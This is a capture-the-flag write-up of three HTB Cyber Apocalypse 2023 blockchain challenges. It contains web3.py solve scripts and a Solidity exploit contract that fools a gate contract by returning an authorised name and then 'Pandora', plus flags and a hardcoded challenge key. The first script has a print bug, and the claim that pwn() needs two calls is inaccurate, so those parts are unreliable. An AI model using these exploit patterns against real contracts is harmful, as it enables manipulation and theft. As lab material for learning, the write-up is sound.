---
title: 'Cyber Apocalypse 2023: The Cursed Mission - Blockchain'
authors:
  - Dang "midas" Le
  - BaoDoktah
date: '2023-03-27T00:00:00Z'
doi: ''

# Schedule page publish date (NOT publication's date).
publishDate: '2023-03-27T01:00:00Z'

# Publication type.
# Legend: 0 = Uncategorized; 1 = Conference paper; 2 = Journal article;
# 3 = Preprint / Working Paper; 4 = Report; 5 = Book; 6 = Book section;
# 7 = Thesis; 8 = Patent
publication_types: ['9']

# Publication name and optional abbreviated publication name.
publication: ''
publication_short: ''

abstract: An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Blockchain category.

# Summary. An optional shortened abstract.
summary: An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Blockchain category.

tags:
  - ctf
  - writeup
  - blockchain
  - htb-2023

featured: true

links:
url_pdf: ''
url_code: ''
url_dataset: ''
url_poster: ''
url_project: ''
url_slides: ''
url_source: ''
url_video: ''

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
image:
  caption: 'Image credit: [**HTB**](https://www.hackthebox.com/)'

# Associated Projects (optional).
#   Associate this publication with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `internal-project` references `content/project/internal-project/index.md`.
#   Otherwise, set `projects: []`.
projects: []

# Slides (optional).
#   Associate this publication with Markdown slides.
#   Simply enter your slide deck's filename without extension.
#   E.g. `slides: "example"` references `content/slides/example/index.md`.
#   Otherwise, set `slides: ""`.
slides:
---
{{< toc >}}

## Navigating the Unknown

* **Given zip:** [Get it here!](https://drive.google.com/drive/folders/1c1hzJIa3CYmJ04it6Ox9a0svpxJZj2JX?usp=share_link)

* **Description:** Your advanced sensory systems make it easy for you to navigate familiar environments, but you must rely on intuition to navigate in unknown territories. Through practice and training, you must learn to read subtle cues and become comfortable in unpredictable situations. Can you use your software to find your way through the blocks?

* **Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.

* **Category:** Blockchain

* **Difficulty:** Very Easy

In this blockchain challenge, we were provided with two smart contracts: `Setup.sol` and `Unknown.sol`. Our goal was to solve the challenge by interacting with the contracts and ensuring that the `isSolved()` function in the Setup contract returns `true`.

The `Setup.sol` contract is responsible for initializing the challenge and providing us with the necessary information to interact with the `Unknown.sol` contract. The Setup contract deploys an instance of the Unknown contract and exposes the `isSolved()` function, which checks if the updated variable in the Unknown contract is set to true.

The `Unknown.sol` contract contains a single function, `updateSensors(uint256 version)`, which sets the updated variable to true if the provided version argument is equal to `10`.

To solve the challenge, we needed to call the updateSensors function in the Unknown contract with the correct version `10`. To do this, we used the `web3.py` library to interact with the blockchain and the smart contracts. This is the python script:

```python
import eth_account
import web3
from web3 import Web3

PRIVATE_KEY= "REPLACE_YOUR_PRIVATE_KEY_HERE"
RPC_URL="http://REPLACE_YOUR_RPC_URL_HERE"
SET_UP_ADRESSS="REPLACE_YOUR_SET_UP_ADRESS_HERE"
UNKNOWN_ADRESSS="REPLACE_YOUR_UNKNOWN_ADRESS_HERE"

w3=Web3(web3.HTTPProvider(RPC_URL))

my_account=eth_account.Account.from_key(PRIVATE_KEY)

SET_UP_ABI = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract Unknown",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]
UNKNOWN_ABI = [
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "version",
				"type": "uint256"
			}
		],
		"name": "updateSensors",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "updated",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

setup_contract=w3.eth.contract(address=SET_UP_ADRESSS,abi=SET_UP_ABI)
unknown_contract=w3.eth.contract(address=UNKNOWN_ADRESSS,abi=UNKNOWN_ABI)

transaction = unknown_contract.functions.updateSensors(10).build_transaction({
    'from': my_account.address,
    'value': 0,
    'gas': 300000,
    'gasPrice': w3.to_wei('10','gwei'),
    'nonce':w3.eth.get_transaction_count(my_account.address)
})
signed_transaction=w3.eth.account.sign_transaction(transaction,PRIVATE_KEY)
transaction_hash=w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt=w3.eth.wait_for_transaction_receipt(transaction_hash)
isSolve = setup_contract.functions.isSolved().call()
print("Challenge solved:" + {isSolve})
```

You can get both SET_UP_ABI and UNKNOWN_ABI by using [Remix IDE](https://remix.ethereum.org) to compile the contracts and get the ABIs. After running the script and we got the flag.

<img src="Solved1.png" alt="Solved" width="1000"/>

Flag is: **HTB{9P5_50FtW4R3_UPd4t3D}**

## Shooting 101

* **Given zip:** [Get it here!](https://drive.google.com/drive/folders/1xT9d1NQPWw5coVwSezV8FBHyyn31QE1c?usp=share_link)

* **Description:** Your metallic body might have advanced targeting systems, but hitting a target is not just about technical proficiency. To truly master the art of targeting, you must learn to trust your instincts and develop a keen sense of intuition. During this training, you will emerge as a skilled marksman who can hit the targets with deadly precision. It's about time to train and prove yourself in the Shooting Area, can you make it?

* **Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.

* **Category:** Blockchain

* **Difficulty:** Very Easy

In the Shooting 101 blockchain challenge, we have two smart contracts: `Setup` and `ShootingArea`. The goal of this challenge is to set the three boolean variables `firstShot`, `secondShot`, and `thirdShot` in the `ShootingArea` contract to `true`. The contract has a few functions with specific modifiers that ensure they can only be called under certain conditions.

To solve the challenge, we need to interact with the contracts and call the functions in the correct order:

1. Call the fallback function of the ShootingArea contract by sending a transaction with 32 bytes of zero data, setting firstShot to true.

2. Call the receive function of the ShootingArea contract by sending a transaction with a non-zero amount of Ether and an empty data field, setting secondShot to true.

3. Call the `third()` function of the ShootingArea contract to set thirdShot to true. Note that we might need to call this function multiple times to ensure it sets the variable to true.

4. Finally, call the `isSolved()` function in the Setup contract to verify if the challenge is solved.

The provided Python script uses the `web3.py` library to interact with the Ethereum contracts:

```python
from web3 import Web3

# Replace the following values with the ones from the challenge
RPC_URL = "http://165.232.98.69:32406"
PRIVATE_KEY = "0xc3416ed8c225000b2b46142b478717e88548165fd4ed3e6afeaf7e9dba27b0af"
SETUP_CONTRACT_ADDRESS = "0x671C8C0f14f48098419FD7E3a51123f8f35F5173"
TARGET_CONTRACT_ADDRESS = "0x544D171d157A7Ebe08C32d1C5e6EEfaaa4e4E889"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

# Get your account from the provided private key
my_account = w3.eth.account.from_key(PRIVATE_KEY)

# Setup contract ABI
SETUP_CONTRACT_ABI = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract ShootingArea",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

# Target contract ABI
TARGET_CONTRACT_ABI = [
	{
		"stateMutability": "payable",
		"type": "fallback"
	},
	{
		"inputs": [],
		"name": "firstShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "secondShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "third",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "thirdShot",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	}
]

# Create contract instances
setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDRESS, abi=SETUP_CONTRACT_ABI)
target_contract = w3.eth.contract(address=TARGET_CONTRACT_ADDRESS, abi=TARGET_CONTRACT_ABI)


def print_status():
    first_shot_status = target_contract.functions.firstShot().call()
    second_shot_status = target_contract.functions.secondShot().call()
    third_shot_status = target_contract.functions.thirdShot().call()
    print(f"First shot: {first_shot_status}, Second shot: {second_shot_status}, Third shot: {third_shot_status}")


# First shot: Call the fallback function
transaction = {
    'from': my_account.address,
    'to': TARGET_CONTRACT_ADDRESS,
    'value': 0,
    'gas': 3000000,
    'gasPrice': w3.to_wei('10', 'gwei'),
    'nonce': w3.eth.get_transaction_count(my_account.address),
    'data': '0x' + '00' * 32,  # Add 32 bytes of zero data to trigger the fallback function
}


signed_transaction = my_account.signTransaction(transaction)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)


print_status()
# Trigger the receive function to hit the second target
transaction['value'] = w3.to_wei('2', 'ether')
transaction['nonce'] = w3.eth.get_transaction_count(my_account.address)
transaction['data'] = '0x'  # Send an empty data field to trigger the receive function

signed_transaction = my_account.signTransaction(transaction)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print_status()

# Trigger the third function to hit the third target
for _ in range(3):  # Increase the number of times we call the third() function
    transaction = target_contract.functions.third().build_transaction({
        'from': my_account.address,
        'gas': 3000000,
        'gasPrice': w3.to_wei('10', 'gwei'),
        'nonce': w3.eth.get_transaction_count(my_account.address),
    })

    signed_transaction = my_account.signTransaction(transaction)
    transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print_status()


# Check if the challenge is solved
is_solved = setup_contract.functions.isSolved().call()
print("Challenge solved:", is_solved)
```

Run the script and get the flag.

<img src="Solved2.png" alt="Solved" width="1000"/>

Flag is: **HTB{f33l5_n1c3_h1771n6_y0ur_74r6375}**

**Fun fact: The script used to solve this challenge was generated by ChatGPT.**

## The Art Of Deception

* **Given zip:** [Get it here!](https://drive.google.com/drive/folders/1372QkXFtk-wwnEQRMxV2wkysXJtazzcn?usp=share_link)

* **Description:** Your cyborg abilities are not always the most effective tools for achieving your goals. Sometimes, you need to go unnoticed and blend in with your surroundings. To achieve this, you must learn to assume new identities and blend in with different groups of people. Mastering the art of deception requires subtlety, observation, and the ability to read people's motivations and intentions. After completing this training, you will emerge as a skilled infiltrator, capable of seamlessly blending in with your surroundings and achieving your objectives with stealth and subtlety. Can you bypass the High Security Gate and sneak into the Fortified Perimeter?

* **Note:** This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.

* **Category:** Blockchain

* **Difficulty:** Easy

In this challenge, the objective is to trick the `HighSecurityGate` contract, making its lastEntrant equal to `Pandora`. The `Setup` contract imports and initializes the `HighSecurityGate` contract. The `isSolved()` function checks if the lastEntrant variable in the `HighSecurityGate` contract is equal to `Pandora`.
```solidity
    function isSolved() public view returns (bool) {
        return TARGET.strcmp(TARGET.lastEntrant(), "Pandora");
    }
```
The `HighSecurityGate` contract has an array of authorized names (Orion, Nova, and Eclipse), and the `enter()` function checks if the name returned by the Entrant interface implementation matches any of the authorized names. If it does, the lastEntrant variable is updated with the returned name.
```solidity
    string[] private authorized = ["Orion", "Nova", "Eclipse"];
    string public lastEntrant;

    function enter() external {
        Entrant _entrant = Entrant(msg.sender);

        require(_isAuthorized(_entrant.name()), "Intruder detected");
        lastEntrant = _entrant.name();
    }

    function _isAuthorized(string memory _user) private view returns (bool){
        for (uint i; i < authorized.length; i++){
            if (strcmp(_user, authorized[i])){
                return true;
            }
        }
        return false;
    }
 ```
To exploit this setup, an `Exploit` contract is created, implementing the Entrant interface with a `name()` function that returns an authorized name on the first call and `Pandora` on the second call. This contract also has a `pwn()` function that calls the `enter()` function of the `HighSecurityGate` contract, with the Exploit contract acting as the sender. This is the `Exploit` contract:

```solidity
pragma solidity ^0.8.18;

import "./Setup.sol";

interface Entrant {
    function name() external returns (string memory);
}

contract Exploit is Entrant {
    address payable public targetAddr;
    Setup targetContract;
    bool public first;

    constructor(address payable _addr) payable {
        targetAddr = payable(_addr);
        targetContract = Setup(targetAddr);
        first = true;
    }

    function name() external returns (string memory){
        if (first) {
            first = false;
            return "Orion";
        } else {
            return "Pandora";
        }
    }

    function pwn() public {
        targetContract.TARGET().enter();
    }
}
```
To deploy the `Exploit` contract, we used `foundry-rs` (you can find it here: https://github.com/foundry-rs/foundry) :
```shell
forge create Exploit --rpc-url <rpc_url> --private-key <private_key> --constructor-args <setup_contract_address> --value 100ether
```
After deploying the `Exploit` contract, call the `pwn()` function twice. On the first call, the `name()` function will return an authorized name, updating the `lastEntrant` variable in the `HighSecurityGate` contract. On the second call, the `name()` function will return `Pandora`, updating the `lastEntrant` variable to the desired value.
When the `lastEntrant` variable set to `Pandora`, the `isSolved()` function in the `Setup` contract will return `true`, indicating that the challenge has been successfully solved.

Flag is: **HTB{H1D1n9_1n_PL41n_519H7}**
